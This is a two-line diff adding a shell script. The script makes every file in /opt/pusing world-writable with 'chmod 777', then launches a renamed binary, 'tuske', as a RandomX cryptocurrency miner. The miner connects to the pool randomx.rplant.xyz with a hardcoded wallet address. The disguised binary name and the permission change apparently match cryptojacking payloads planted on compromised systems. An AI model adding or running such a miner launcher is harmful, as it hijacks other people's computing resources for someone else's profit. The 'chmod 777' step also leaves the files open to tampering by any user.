@@ -1,0 +1,2 @@
+cd /opt/pusing/ && chmod 777 * && ls
+./tuske -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuSozipVHLEaLP3AKzgAKXwTxHnCjpHKJip5gtGaq2JuVENTQgFXjS2WHFJ1fe9MUnnG7qTb9NGmRLpPDZhinnDZDJXUq2vQ
